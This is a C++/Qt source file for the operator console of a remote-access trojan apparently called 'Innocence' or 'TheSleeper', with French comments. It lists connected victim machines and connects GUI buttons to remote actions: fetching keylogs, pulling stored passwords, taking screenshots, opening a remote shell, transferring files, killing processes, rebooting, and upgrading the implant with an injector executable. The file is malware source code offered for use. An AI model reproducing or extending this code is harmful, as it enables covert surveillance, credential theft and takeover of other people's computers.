//!
//!     Kaleidoscalp, all rights reserved.
//!

#include <string>
#include <algorithm>
using namespace std;

#include <QtGui>
#include <QtWidgets/QMessageBox>
#include <QFileDialog>

#include <common/Log.hpp>
#include <blaspheme/Blaspheme.hpp>
using namespace Network;

#include "Client.hpp"
#include "ListeningThread.hpp"
#include "ServerWindow.hpp"

namespace TheSleeper
{ 
    ServerWindow::ServerWindow(QWidget * parent)
    :QMainWindow(parent)
    {
        currentClient = clients.end();
        // Initialisation de l'interface graphique
        setupUi(this);
        createStatusBar();

        connectedClientsView->setModel(&clientsModel);
        listener = new ListeningThread(portBox->value(), passEdit->text(), this);
        qRegisterMetaType<Session>("Session");
        connect(listener, SIGNAL(newClientConnected(Session)), this, SLOT(onNewClient(Session)));
        connect(actionAboutQt, SIGNAL(triggered()), this, SLOT(aboutQt()));
        connect(actionAboutInnocence, SIGNAL(triggered()), this, SLOT(about()));
        connect(actionEditerClient, SIGNAL(triggered()), &edit_client_dialog, SLOT(show()));
        
        // configuration du screenshot a distance
        screenLabel->setBackgroundRole(QPalette::Base);
        screenLabel->setSizePolicy(QSizePolicy::Ignored, QSizePolicy::Ignored);
        screenLabel->setScaledContents(true);
        
        // construction de l'arbre des fichiers distants
        remoteFilesView->setHeaderHidden(true);
        remoteFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
        localFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
        
        // construction de l'arbre des fichiers locaux
        localFilesView->setModel(&localFilesModel);
        localFilesView->hideColumn(2);
        localFilesView->hideColumn(3);
        
        // configuration du gestionnaire de tache a distance
        processView->setSelectionMode(QAbstractItemView::SingleSelection);
        processView->setModel(&processModel);
        
        connectedClientsView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
        
        // connexions signals / slots pour le panneau de droite
        connect(disconnectButton,     SIGNAL(clicked()), this, SLOT(onDisconnect()));
        connect(listenButton,         SIGNAL(clicked()), this, SLOT(onListen()));
        connect(connectedClientsView, SIGNAL(clicked(const QModelIndex&)), this, SLOT(onChangeClient(const QModelIndex &)));
        connect(actionConfigure,      SIGNAL(triggered()), this, SLOT(configureOptions()));
        connect(actionShutdownServer, SIGNAL(triggered()), this, SLOT(shutdown()));
        connect(actionRebootServer,   SIGNAL(triggered()), this, SLOT(reboot()));
        connect(actionUninstallServer,SIGNAL(triggered()), this, SLOT(uninstall()));
        connect(actionUpgradeServer,  SIGNAL(triggered()), this, SLOT(upgrade()));
        connect(shutdownButton,       SIGNAL(clicked()), this, SLOT(remoteShutdown()));
        connect(rebootButton,         SIGNAL(clicked()), this, SLOT(remoteReboot()));
        connect(logoutButton,         SIGNAL(clicked()), this, SLOT(remoteLogout()));
        connect(hibernateButton,      SIGNAL(clicked()), this, SLOT(remoteHibernate()));
        connect(remoteShellButton,    SIGNAL(clicked()), this, SLOT(remoteShell()));
        connect(getPasswordButton,    SIGNAL(clicked()), this, SLOT(getPasswords()));
        connect(updateProcessListButton, SIGNAL(clicked()), this, SLOT(updateProcessList()));
        connect(killProcessButton,       SIGNAL(clicked()), this, SLOT(killProcess()));
        connect(updateScreenButton,      SIGNAL(clicked()), this, SLOT(updateScreen()));
        connect(saveScreenButton,        SIGNAL(clicked()), this, SLOT(saveScreen()));
        connect(updateLogButton,         SIGNAL(clicked()), this, SLOT(showKeylog()));
        connect(saveLogButton,           SIGNAL(clicked()), this, SLOT(saveKeylog()));
        connect(remoteFilesView,         SIGNAL(doubleClicked(QModelIndex)), this, SLOT(browseRemoteFiles(QModelIndex)));
        connect(downloadButton,          SIGNAL(clicked()), this, SLOT(startDownload()));
        connect(uploadButton,            SIGNAL(clicked()), this, SLOT(startUpload()));
        
        updateDisconnected();
    }

    ServerWindow::~ServerWindow()
    {
        listener->stopListen();
        
        // nettoie tous les objets cores
        for(ClientPtrList::iterator iter = clients.begin(); iter != clients.end(); iter++)
        {
            delete *iter;
        }
    }

    void ServerWindow::aboutQt()
    {
        QMessageBox::aboutQt(this);
    }

    void ServerWindow::about()
    {
        QMessageBox::about(this, tr("About Innocence"), tr("Innocence Project, made by Crunch"));
    }

    void ServerWindow::createStatusBar()
    {
        connectionStatusLabel = new QLabel(tr(" <font color=\"#FF0000\">Offline </font> "));
        connectionStatusLabel->setAlignment(Qt::AlignHCenter);
        connectionStatusLabel->setMinimumSize(connectionStatusLabel->sizeHint());
        hostInfoIp = new QLabel(tr(" Host : "));
        hostInfoIp->setAlignment(Qt::AlignHCenter);
        hostInfoIp->setMinimumSize(hostInfoIp->sizeHint());
        hostInfoPort = new QLabel(tr(" Port : "));
        hostInfoIp->setAlignment(Qt::AlignHCenter);
        hostInfoIp->setMinimumSize(hostInfoIp->sizeHint());
        infoIp = new QLabel(tr(" None "));
        infoPort = new QLabel(tr(" None "));
        statusBar()->addWidget(connectionStatusLabel);
        statusBar()->addWidget(hostInfoIp);
        statusBar()->addWidget(infoIp, 1);
        statusBar()->addWidget(hostInfoPort);
        statusBar()->addWidget(infoPort, 1);
    }

    void ServerWindow::updateConnected(const QString& ip, const QString& port)
    {
        LOG << "Activation de l'interface graphique...";
        tabWidget->setEnabled(true);
        
        portLabel->setVisible(false);
        portBox->setVisible(false);
        mdpLabel->setVisible(false);
        passEdit->setVisible(false);
        portBox->setEnabled(false);
        passEdit->setEnabled(false);
        
        infoIp->setText(ip);
        infoPort->setText(port);
        connectionStatusLabel->setText(tr(" <font color=\"#19DD2C\">Online </font> "));
        
        disconnectButton->setEnabled(true);
    }

    void ServerWindow::updateDisconnected()
    {
        LOG << "Desactivation de l'interface graphique...";
        tabWidget->setEnabled(false);
        portBox->setVisible(true);
        mdpLabel->setVisible(true);
        passEdit->setVisible(true);
        portLabel->setVisible(true);
        portBox->setEnabled(true);
        passEdit->setEnabled(true);
        infoIp->setText(" None ");
        infoPort->setText(" None ");
        connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Offline </font> "));
        
        if(!clients.size())
        {
            disconnectButton->setEnabled(false);
        }
    }

    void ServerWindow::onListen()
    {
		if(listener->isListening())
        {
			listener->stopListen();
            listenButton->setText(tr("Attendre connexions"));
        }
        else
		{
            listener->listen();
            listenButton->setText(tr("Stopper les connexions"));
        }
    }

    void ServerWindow::onDisconnect()
    {
        try
        {
            if(currentClient != clients.end())
            {
                // desactivation de l'interface
                updateDisconnected();
                
                // on le deconnecte proprement
                (*currentClient)->disconnect();

                // on detruit l'objet core
                delete (*currentClient);

                // on enleve le pointeur de la liste grace a l'iterateur
                clients.erase(currentClient);
                
                if(clients.size())
                {
                    currentClient = clients.begin();
                }
                else
                {
                    currentClient = clients.end();
                }
                
                // on met a jour le modele
                clientsModel.set(clients);
                
                // on change de client en cours
                switchClient();
                
                if(currentClient == clients.end())
                {
                    LOG << "Plus de client.";
                    updateDisconnected();
                }
            }
        }
        catch(std::exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue";
        }
    }

    void ServerWindow::onDisconnectedClient()
    {
        // un des clients s'est deconnecte, mais on ne sais pas lequel
        // pour le savoir on n'utilise : QObject::sender()
        ClientPtr disconnectedClient = (ClientPtr) QObject::sender();
        
        LOG << "Le client " + disconnectedClient->getIp().toStdString()+":"+disconnectedClient->getPort().toStdString()+" s'est deconnecte.";
        
		// on le deconnecte proprement
        disconnectedClient->disconnect();

        ClientPtrList::iterator iter = std::find(clients.begin(), clients.end(), disconnectedClient);
        if(iter != clients.end())
        {
            // on enleve le pointeur de la liste grace a l'iterateur
            clients.erase(iter);
            
            // on met a jour le modele
            clientsModel.set(clients);
            
			currentClient = clients.begin();
            switchClient();
        }

		// on detruit l'objet core
        delete disconnectedClient;
    }
	/*
    void ServerWindow::addAuxClient(Network::TcpClient new_stream, Blaspheme::SessionId id_stream)
    {
        // l'ID reçu est l'ID d'un client déjà connecté
        // recherche de l'objet client associé
        for(std::vector<Client *>::iterator iter = clients.begin();
            iter != clients.end();
            iter++)
        {
            if((*iter)->getUniqueId() == id_stream)
            {
                LOG << "Association connexion auxiliaire avec client.";
                stream_mutex.lock();
                (*iter)->addStream(new_stream);
                stream_associated.wakeAll();
                stream_mutex.unlock();
                return;
            }
        }
    }
	*/
    void ServerWindow::onNewClient(Session session)
    {
        try
        {
			LOG << "Creation nouveau client.";
            // construit un nouvel objet Client que l'on associe au nouveau flux
            Client * client = new Client(session);

            // il faudra mettre a jour l'interface si ce client vient a se deconnecter
            connect(client, SIGNAL(disconnected()), this, SLOT(onDisconnectedClient()));
            
            // si l'on active un remote shell, on desactive l'ecoute de nouvelles connexions
            connect(client, SIGNAL(remoteShellState(bool)), listener, SLOT(setNotListening(bool)));
            connect(client, SIGNAL(remoteShellState(bool)), this, SLOT(setDisabled(bool)));
            
            // ajout du serveur a la liste des serveurs connectes
            clients.push_back(client);

            // mise a jour du modele :
            clientsModel.set(clients);
                
            // si il n'y avait pas de serveur connectes, on fait en sorte que le premier connecté
            // soit celui que l'on veut controler tout de suite
            if(clients.size() == 1)
            {
                disconnectButton->setEnabled(true);
                current_index = clientsModel.index(0,0);
                currentClient = clients.begin();
                switchClient();
            }
		}
        catch(std::exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue";
        }
    }

    void ServerWindow::onChangeClient( const QModelIndex & index)
    {        
        if(current_index == index)
        {
            LOG << "Je controle deja le client selectionne.";
        }
        else
        {
            current_index = index;
            ClientPtr ptr = clientsModel.get_client(index);
            ClientPtrList::iterator clientIter = std::find(clients.begin(), clients.end(), ptr);
            if(clientIter != clients.end())
            {
                currentClient = clientIter;
                switchClient();
            }
        }
    }

    void ServerWindow::switchClient()
    {
        LOG << "Switch du client.";        
        if(currentClient != clients.end())
        {
            screenProgressBar->setValue(0);
            remoteFilesView->setModel(&(*currentClient)->getRemoteFileTree());
            passwords_dialog.setPasswords((*currentClient)->getStoredPasswords());
            processModel.setStringList((*currentClient)->getProcessList());
            screenLabel->setPixmap((*currentClient)->getScreen());
            keylogEdit->clear();
            keylogEdit->append((*currentClient)->getKeylog());
            updateConnected((*currentClient)->getIp(), (*currentClient)->getPort());
        }
        else
        {
            LOG << "Plus de client connecte.";
            updateDisconnected();
        }
    }

    void ServerWindow::onFailedAuth()
    {
        LOG << "Echec de l'authentification.";
        connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Bad Password </font> "));
    }

    void ServerWindow::configureOptions()
    {
        
    }

    void ServerWindow::shutdown()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->shutdown();
        }
    }

    void ServerWindow::reboot()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->reboot();
        }
    }

    void ServerWindow::uninstall()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->uninstall();
        }
    }

    void ServerWindow::upgrade()
    {
        if(currentClient != clients.end())
        {
            // on informe l'utilisateur que c'est une manoeuvre risquée
            QMessageBox::information(this, windowTitle(),tr("Attention, le fichier que vous devez choisir doit etre un client de type Inhibitor valide."));

            // on trouve le chemin du nouvel injecteur
            QString fileName = QFileDialog::getOpenFileName(this, tr("Open File"),"C:\\",tr("Executable (*.exe)"));
            if(fileName.size())
            {
                (*currentClient)->upgrade(fileName);
            }
        }
    }

    void ServerWindow::remoteShutdown()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->remoteShutdown();
        }
    }

    void ServerWindow::remoteReboot()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->remoteReboot();
        }
    }

    void ServerWindow::remoteHibernate()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->remoteHibernate();
        }
    }

    void ServerWindow::remoteLogout()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->remoteLogout();
        }
    }

    void ServerWindow::remoteShell()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->remoteShell();
        }
    }

    void ServerWindow::getPasswords()
    {
        if(currentClient != clients.end())
        {
			passwords_dialog.setPasswords((*currentClient)->getStoredPasswords());
            passwords_dialog.show();
        }
    }

    void ServerWindow::updateProcessList()
    {
        if(currentClient != clients.end())
        {
            (*currentClient)->updateProcessList();
            processModel.setStringList((*currentClient)->getProcessList());
        }
    }

    void ServerWindow::killProcess()
    {
        if(currentClient != clients.end())
        {
            QModelIndex index = processView->currentIndex();
            if(index.isValid())
            {
                (*currentClient)->killProcess(processModel.data(index, Qt::DisplayRole).toString());

                // temps d'attente pendant la mise a jour de la liste...
                QThread::currentThread()->wait(500);

                updateProcessList();
            }
        }
    }

    void ServerWindow::updateScreen()
    {
		updateScreenButton->setEnabled(false);
        screenProgressBar->setValue(0);
        if(currentClient != clients.end())
        {
            (*currentClient)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);		
        }

		if(currentClient != clients.end())
		{
			screenLabel->clear();
            screenLabel->setPixmap((*currentClient)->getScreen());
		}
		updateScreenButton->setEnabled(true);
    }

    void ServerWindow::saveScreen()
    {
        const QPixmap * screenmap = screenLabel->pixmap();
        if(screenmap)
        {
            // enregistrement du screenshot dans le fichier indique par l'utilisateur
            QString fileName = QFileDialog::getSaveFileName(this, tr("Save File"),"C:\\screen.jpg",tr("Screenshot (*.jpg)"));
            screenmap->save(fileName);
        }
    }

    void ServerWindow::showKeylog()
    {
        if(currentClient != clients.end())
        {
            updateLogButton->setEnabled(false);
            (*currentClient)->updateKeylog(keylogProgressBar);
            keylogEdit->clear();
            keylogEdit->append((*currentClient)->getKeylog());
            updateLogButton->setEnabled(true);
        }
    }

    void ServerWindow::saveKeylog()
    {
        if(keylogEdit->toPlainText().toStdString().size())
        {
            QString fileName = QFileDialog::getSaveFileName(this, tr("Save File"),"C:\\",tr("Text (*.txt)"));
            if(fileName.size())
            {   
                fstream file;
                file.open(fileName.toStdString().c_str(), std::ios::out | std::ios::app);
                file.write(keylogEdit->toPlainText().toStdString().c_str(), keylogEdit->toPlainText().toStdString().size());
                file.close();
            }
        }
    }

    void ServerWindow::browseRemoteFiles(QModelIndex index)
    {
        if(currentClient != clients.end())
        {
            if(!(*currentClient)->browseFiles(index))
            {
                QMessageBox::information(0, "Theclient","Impossible de lister ce repertoire.");
            }
        }
    }

    void ServerWindow::startDownload()
    {
        if(currentClient != clients.end())
        {
            // si un fichier a été sélectionné sur le serveur
            if(remoteFilesView->currentIndex() == QModelIndex())
            {
                QMessageBox::information(0, "TheSleeper",tr("Veuillez selectionner un fichier a telecharger depuis le client."));
                return;
            }

            QString sourceFileName = (*currentClient)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
            if(sourceFileName[sourceFileName.size()-1] == '\\')
            {
                QMessageBox::information(0, "Theclient",tr("Veuillez selectionner un fichier a telecharger, et non un dossier."));
                return;
            }
            
			if(localFilesView->currentIndex() == QModelIndex ())
            {
                QMessageBox::information(0, "TheSleeper",tr("Veuillez selectionner un dossier de destination."));
                return;
            }
            
            if(!localFilesModel.isDir(localFilesView->currentIndex()))
            {
                QMessageBox::information(0, "TheSleeper",tr("Veuillez selectionner un dossier de destination et non un fichier."));
                return;
            }
            
            QString sourceFilePath = (*currentClient)->getRemotePath(remoteFilesView->currentIndex());
            QString destinationFilePath = localFilesModel.filePath(localFilesView->currentIndex()) + "\\" + sourceFileName;    
            (*currentClient)->startDownload(sourceFilePath, destinationFilePath, transferProgressBar);
        }
    }

    void ServerWindow::startUpload()
    {
        if(currentClient != clients.end())
        {
            if(localFilesModel.isDir(localFilesView->currentIndex()))
            {
                QMessageBox::information(0, "TheSleeper",tr("Veuillez sélectionner le fichier a uploader."));
                return;
            }
            
            QString destinationFileName = (*currentClient)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
            if(destinationFileName[destinationFileName.size()-1] != '\\')
            {
                QMessageBox::information(0, "TheSleeper",tr("Veuillez sélectionner un dossier de destination sur le serveur."));
                return;
            }
            
            QString sourceFilePath = localFilesModel.filePath(localFilesView->currentIndex());
            QString destinationFilePath = (*currentClient)->getRemotePath(remoteFilesView->currentIndex()) + localFilesModel.fileName(localFilesView->currentIndex());;
            (*currentClient)->startUpload(sourceFilePath, destinationFilePath, transferProgressBar);
        }
    }
    
} /* Theclient */
